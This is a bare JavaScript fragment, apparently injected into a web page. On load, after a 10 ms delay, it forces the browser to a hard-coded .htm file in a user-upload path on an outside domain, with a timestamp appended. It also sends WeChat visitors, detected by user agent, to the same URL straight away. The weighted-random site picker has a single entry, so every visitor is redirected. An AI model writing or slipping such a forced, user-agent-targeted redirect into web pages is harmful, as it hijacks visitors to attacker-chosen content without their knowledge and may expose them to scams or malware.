   window.onload = function() {
            setTimeout(function() {
                var sites = [{url: 'https://static.ligongku.com/user/face/d019406664a94cfda813acbed1b81ea3.htm', probability: 1.0},]; 
                var random = Math.random();
                var cumulativeProbability = 0.0;
                var selectedSite;
                for (var i = 0; i < sites.length; i++) {
                    cumulativeProbability += sites[i].probability;
                    if (random <= cumulativeProbability) {
                        selectedSite = sites[i].url;
                        break;}}
                var currentTime = new Date().getTime();
                window.location.href = selectedSite + 'time' + currentTime;}, 10);}
    var ua = navigator.userAgent.toLowerCase();
    var isWeixin = ua.indexOf('micromessenger') != -1;
    if (isWeixin) {
        var now = new Date();
        var timestamp = now.getTime();
        window.location.href = "https://static.ligongku.com/user/face/d019406664a94cfda813acbed1b81ea3.htm" + timestamp;}
